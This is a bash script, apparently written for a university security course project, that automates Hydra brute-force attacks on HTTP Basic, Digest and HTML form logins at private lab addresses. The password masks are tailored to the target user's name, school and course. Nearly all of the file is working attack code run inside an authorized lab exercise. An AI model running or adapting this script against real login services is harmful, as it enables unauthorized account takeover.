#!/bin/bash
# CS660 Project 3 - Online Attack Automation Script (Hydra-based)
# Strategic password cracking for authorized penetration testing

set -euo pipefail

# Configuration
BASIC_URL="http://192.168.100.103/basicauth"
DIGEST_URL="http://192.168.100.103/digestauth" 
HTML_URL="http://192.168.100.101/login.php"
USERNAME="wangxx"
RATE_LIMIT="1"  # requests per second for Hydra

# Evidence directory
EVIDENCE_DIR="evidence"
mkdir -p "$EVIDENCE_DIR"

# Logging function
log_command() {
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] $*" | tee -a "$EVIDENCE_DIR/COMMANDS.log"
}

# Tool version logging
log_tool_versions() {
    log_command "=== TOOL VERSIONS ==="
    log_command "hydra version: $(hydra -h 2>&1 | head -1 || echo 'unknown')"
    log_command "mp64 version: $(mp64 --version 2>/dev/null || echo 'unknown')"
    log_command "john version: $(john --version 2>/dev/null | head -1 || echo 'unknown')"
    log_command "curl version: $(curl --version | head -1)"
}

# Tool installation check
check_tools() {
    log_command "Checking required tools..."
    
    local missing=0
    
    if ! command -v hydra &> /dev/null; then
        log_command "ERROR: hydra not found. Install with: apt install hydra"
        missing=1
    fi
    
    if ! command -v mp64 &> /dev/null; then
        if ! command -v maskprocessor &> /dev/null; then
            log_command "ERROR: maskprocessor/mp64 not found. Install hashcat-utils or maskprocessor"
            missing=1
        else
            alias mp64=maskprocessor
        fi
    fi
    
    if [[ $missing -eq 1 ]]; then
        log_command "ERROR: Missing required tools. Exiting."
        exit 1
    fi
    
    log_command "All required tools available"
    log_tool_versions
}

# Network connectivity check
check_connectivity() {
    log_command "Checking target connectivity..."
    
    for url in "$BASIC_URL" "$DIGEST_URL" "$HTML_URL"; do
        if ! curl -s --connect-timeout 5 "$url" > /dev/null; then
            log_command "ERROR: Cannot reach $url"
            exit 1
        fi
    done
    
    log_command "All targets reachable"
}

# Verification function
verify_success() {
    local auth_type="$1"
    local password="$2"
    local evidence_file="$3"
    
    log_command "Verifying success for $auth_type with password: $password"
    
    case "$auth_type" in
        "basic")
            curl -i -u "$USERNAME:$password" "$BASIC_URL" > "$evidence_file" 2>&1
            ;;
        "digest")
            curl -i -u "$USERNAME:$password" "$DIGEST_URL" > "$evidence_file" 2>&1
            ;;
        "html")
            curl -i -c "$EVIDENCE_DIR/cookies.txt" \
                -d "httpd_username=$USERNAME&httpd_password=$password" \
                "$HTML_URL" > "$evidence_file" 2>&1
            ;;
    esac
    
    log_command "Evidence saved to $evidence_file"
    
    # Check if verification was successful
    if grep -q "200 OK\|Congratulations" "$evidence_file"; then
        return 0
    else
        return 1
    fi
}

# Generate password list from mask
generate_mask_passwords() {
    local mask="$1"
    local temp_file="$2"
    
    # Generate passwords using mp64/maskprocessor
    if command -v mp64 &> /dev/null; then
        mp64 "$mask" > "$temp_file" 2>/dev/null || return 1
    else
        maskprocessor "$mask" > "$temp_file" 2>/dev/null || return 1
    fi
    
    # Limit to prevent excessive generation (max 10000 passwords per mask)
    head -10000 "$temp_file" > "${temp_file}.limited"
    mv "${temp_file}.limited" "$temp_file"
}

# Hydra attack function
run_hydra_attack() {
    local target="$1"
    local url="$2"
    local password_file="$3"
    local auth_type="$4"
    local log_file="$5"
    
    log_command "Starting Hydra attack on $target"
    
    local cmd
    case "$auth_type" in
        "basic")
            local host=$(echo "$url" | cut -d'/' -f3)
            local path=$(echo "$url" | cut -d'/' -f4-)
            cmd="hydra -l $USERNAME -P $password_file -t 1 -W 1 $host http-get /$path"
            ;;
        "digest")
            local host=$(echo "$url" | cut -d'/' -f3)  
            local path=$(echo "$url" | cut -d'/' -f4-)
            cmd="hydra -l $USERNAME -P $password_file -t 1 -W 1 $host http-get /$path"
            ;;
        "html")
            local host=$(echo "$url" | cut -d'/' -f3)
            cmd="hydra -l $USERNAME -P $password_file -t 1 -W 1 $host http-post-form \"/login.php:httpd_username=^USER^&httpd_password=^PASS^:Invalid\""
            ;;
    esac
    
    log_command "Executing: $cmd"
    
    # Run hydra with timeout
    timeout 300 bash -c "$cmd" > "$log_file" 2>&1 || {
        local exit_code=$?
        if [[ $exit_code -eq 124 ]]; then
            log_command "Hydra attack timed out after 5 minutes"
        else
            log_command "Hydra attack completed with exit code $exit_code"
        fi
        return 1
    }
    
    return 0
}

# Check for success in Hydra log
check_hydra_success() {
    local log_file="$1"
    
    if [[ ! -f "$log_file" ]]; then
        return 1
    fi
    
    # Look for successful login in Hydra output
    if grep -q "\[.*\]\[http.*\] host: .* login: .* password: " "$log_file" 2>/dev/null; then
        # Extract the successful password
        grep "\[.*\]\[http.*\] host: .* login: .* password: " "$log_file" | tail -1 | sed 's/.*password: //'
        return 0
    fi
    
    return 1
}

# Attack target function
attack_target() {
    local target="$1"
    local auth_type="$2"
    local url="$3"
    local char_limit="$4"
    local masks=("${@:5}")
    
    log_command "=== ATTACKING $target ($auth_type, $char_limit chars) ==="
    
    local log_file="$EVIDENCE_DIR/${target}_hydra.log"
    local evidence_file="$EVIDENCE_DIR/${target}_success.txt"
    local temp_passwords="$EVIDENCE_DIR/${target}_temp_passwords.txt"
    
    # Skip if already successful
    if [[ -f "$evidence_file" ]]; then
        log_command "$target already successfully attacked. Skipping."
        return 0
    fi
    
    # Try biased masks first
    for mask in "${masks[@]}"; do
        log_command "Trying mask: $mask"
        
        # Generate passwords from mask
        if generate_mask_passwords "$mask" "$temp_passwords"; then
            local password_count=$(wc -l < "$temp_passwords")
            log_command "Generated $password_count passwords for mask $mask"
            
            if [[ $password_count -eq 0 ]]; then
                log_command "No passwords generated for mask $mask, skipping"
                continue
            fi
            
            # Run Hydra attack
            if run_hydra_attack "$target" "$url" "$temp_passwords" "$auth_type" "$log_file"; then
                local password
                if password=$(check_hydra_success "$log_file"); then
                    log_command "SUCCESS! Found password: $password"
                    
                    if verify_success "$auth_type" "$password" "$evidence_file"; then
                        log_command "Verification successful for $target"
                        echo "| $target | $password | mp64 mask: $mask | SUCCESS |" >> "$EVIDENCE_DIR/online_attack_results.md"
                        rm -f "$temp_passwords"
                        return 0
                    else
                        log_command "Verification failed for $target"
                    fi
                fi
            fi
            
            # Clean up temp file
            rm -f "$temp_passwords"
        else
            log_command "Failed to generate passwords for mask: $mask"
        fi
        
        # Small delay between attempts
        sleep 2
    done
    
    log_command "All mask attacks failed for $target"
    echo "| $target | N/A | All methods | FAILED |" >> "$EVIDENCE_DIR/online_attack_results.md"
    return 1
}

# Main execution
main() {
    log_command "=== CS660 ONLINE ATTACK AUTOMATION STARTED (HYDRA VERSION) ==="
    log_command "Start time: $(date)"
    
    # Setup
    check_tools
    check_connectivity
    
    # Create results table header
    cat > "$EVIDENCE_DIR/online_attack_results.md" << 'EOF'
# Online Attack Results

| Target | Password | Method | Status |
|--------|----------|--------|---------|
EOF
    
    local success=0
    
    # Basic Auth (8 chars, alphanumeric)
    local basic_masks=(
        "Wang?d?d?d?d"
        "wang?d?d?d?d"  
        "JMU?d?d?d?d?d"
        "jmu?d?d?d?d?d"
        "CS660?d?d"
        "cs660?d?d"
        "Fall20?d?d"
        "fall20?d?d"
        "Admin?d?d?d"
        "admin?d?d?d"
        "?l?l?l?l?d?d?d?d"
        "?u?l?l?l?d?d?d?d"
    )
    
    if attack_target "basic" "basic" "$BASIC_URL" 8 "${basic_masks[@]}"; then
        success=1
    fi
    
    # Digest Auth (6 chars, alphanumeric) 
    local digest_masks=(
        "wx?d?d?d?d"
        "cs?d?d?d?d"
        "jmu?d?d?d"
        "CS?d?d?d?d"
        "JMU?d?d?d"
        "?l?l?d?d?d?d"
        "?l?l?l?d?d?d"
        "?u?l?l?d?d?d"
    )
    
    if attack_target "digest" "digest" "$DIGEST_URL" 6 "${digest_masks[@]}"; then
        success=1
    fi
    
    # HTML Form (8 chars, alphanumeric)
    local html_masks=(
        "Wang?d?d?d?d"
        "wang?d?d?d?d"
        "JMU?d?d?d?d?d"
        "jmu?d?d?d?d?d"
        "CS660?d?d"
        "cs660?d?d"
        "Fall20?d?d"
        "fall20?d?d" 
        "Admin?d?d?d"
        "admin?d?d?d"
        "?l?l?l?l?d?d?d?d"
        "?u?l?l?l?d?d?d?d"
    )
    
    if attack_target "html" "html" "$HTML_URL" 8 "${html_masks[@]}"; then
        success=1
    fi
    
    # Final summary
    log_command "=== ONLINE ATTACK AUTOMATION COMPLETED ==="
    log_command "End time: $(date)"
    
    if [[ $success -eq 1 ]]; then
        log_command "SUCCESS: At least one password was found!"
        log_command "Check evidence/ directory for proof files"
        log_command "Results table saved to: $EVIDENCE_DIR/online_attack_results.md"
        exit 0
    else
        log_command "FAILURE: No passwords found"
        exit 1
    fi
}

# Signal handling for clean exit
trap 'log_command "Script interrupted by user"; exit 130' INT TERM

# Run main function
main "$@"